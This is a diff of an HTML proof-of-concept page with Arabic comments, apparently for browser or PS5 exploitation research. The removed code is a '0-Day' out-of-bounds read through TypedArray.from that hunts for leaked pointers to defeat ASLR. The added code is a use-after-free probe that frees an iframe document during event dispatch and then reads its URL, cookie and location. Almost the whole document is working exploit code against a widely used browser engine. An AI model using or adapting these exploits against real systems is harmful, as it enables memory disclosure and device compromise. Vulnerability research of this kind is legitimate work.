@@ -1,54 +1,76 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>PS5 0-Day OOB Read via TypedArray.from</title>
-</head>
 <body>
-<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
+<button onclick="main()">اختبار: Document Reclaim Leak</button>
+<pre id="log"></pre>
 <script>
-const L = s => { document.getElementById('log').textContent += s + '\n'; };
+function log(m) { document.getElementById('log').textContent += m + '\n'; }
 
-L('[*] Starting 0-Day OOB Read test...');
+function main() {
+    log('=== Document Reclaim Leak Test ===');
 
-// 1. إنشاء مصفوفة صغيرة بحجم حقيقي (VectorLength = 3)
-let arr = [1, 2, 3];
+    const f = document.body.appendChild(document.createElement('iframe'));
+    const a = document.createElement('div');
+    const b = a.appendChild(document.createElement('div'));
 
-// 2. زيادة الطول المنطقي (Logical Length) إلى 100
-// هذا لا يغير حجم الـ Butterfly في الذاكرة!
-arr.length = 100;
+    // Listener 1: حرر الـ Document
+    a.addEventListener('a', function() {
+        log('[1] تحرير Document...');
+        document.adoptNode(a);
+        f.remove();
+        // لا نرمي spray — نترك الذاكرة كما هي
+    });
 
-// 3. استدعاء TypedArray.from
-// المسار السريع (genericTypedArrayViewPrivateFuncFromFast) سيدور 100 مرة
-// وس يقرأ 97 عنصراً من خارج حدود الـ Butterfly!
-L('[*] Calling Int32Array.from()...');
-let leaked = Int32Array.from(arr);
+    // Listener 2: buffer
+    a.addEventListener('a', () => {});
 
-// 4. قراءة القيم المسربة
-L('[+] Leaked TypedArray length: ' + leaked.length);
-L('[*] First 5 elements (should be 1,2,3,0,0 or leaked data):');
-for (let i = 0; i < 10; i++) {
-    L('  [' + i + ']: ' + leaked[i]);
-}
+    // Listener 3: اقرأ الخصائص قبل أن يُصفّر المرجع
+    b.addEventListener('a', () => {
+        log('[3] محاولة قراءة Document...');
+        try {
+            var doc = f.contentDocument;
+            if (!doc) {
+                log('[3] f.contentDocument = null');
+                return;
+            }
+            log('[3] f.contentDocument موجود! قراءة الخصائص...');
 
-L('\n[*] If values after index 2 are not 0, we have an Info Leak!');
-L('[*] To break ASLR, we look for values that look like memory addresses (large numbers).');
+            // خصائص آمنة (لا تتبع مؤشرات)
+            try { log('  nodeType: ' + doc.nodeType); } catch(e) { log('  nodeType ERR: ' + e); }
+            try { log('  readyState: ' + doc.readyState); } catch(e) { log('  readyState ERR: ' + e); }
+            try { log('  visibilityState: ' + doc.visibilityState); } catch(e) { log('  visibilityState ERR: ' + e); }
+            try { log('  compatMode: ' + doc.compatMode); } catch(e) { log('  compatMode ERR: ' + e); }
 
-// محاولة استخراج مؤشرات (Pointers)
-let pointers = [];
-for (let i = 3; i < leaked.length; i++) {
-    if (leaked[i] !== 0) {
-        pointers.push({ index: i, value: leaked[i], hex: '0x' + (leaked[i] >>> 0).toString(16) });
-    }
-}
+            // خصائص خطر (تتبع مؤشرات)
+            try { log('  URL: ' + doc.URL); } catch(e) { log('  URL ERR: ' + e); }
+            try { log('  referrer: ' + doc.referrer); } catch(e) { log('  referrer ERR: ' + e); }
+            try { log('  title: ' + doc.title); } catch(e) { log('  title ERR: ' + e); }
+            try { log('  cookie: ' + doc.cookie); } catch(e) { log('  cookie ERR: ' + e); }
+            try { log('  domain: ' + doc.domain); } catch(e) { log('  domain ERR: ' + e); }
+            try { log('  characterSet: ' + doc.characterSet); } catch(e) { log('  characterSet ERR: ' + e); }
+            try { log('  contentType: ' + doc.contentType); } catch(e) { log('  contentType ERR: ' + e); }
 
-if (pointers.length > 0) {
-    L('\n[!!!] FOUND NON-ZERO LEAKED DATA!');
-    for (let p of pointers) {
-        L('  Index ' + p.index + ': ' + p.value + ' (' + p.hex + ')');
-    }
-} else {
-    L('\n[-] All leaked values were 0. Try grooming the heap first.');
+            // خصائص كائن (تتبع مؤشرات)
+            try {
+                var loc = doc.location;
+                if (loc) log('  location.href: ' + loc.href);
+                else log('  location: null');
+            } catch(e) { log('  location ERR: ' + e); }
+
+            try {
+                var elem = doc.documentElement;
+                if (elem) log('  documentElement: ' + elem.tagName);
+                else log('  documentElement: null');
+            } catch(e) { log('  documentElement ERR: ' + e); }
+
+        } catch(e) {
+            log('[3] CRASH أو خطأ: ' + e);
+        }
+    });
+
+    log('إرسال الحدث...');
+    b.dispatchEvent(new Event('a', { bubbles: true }));
+    log('=== انتهى ===');
 }
 </script>
 </body>
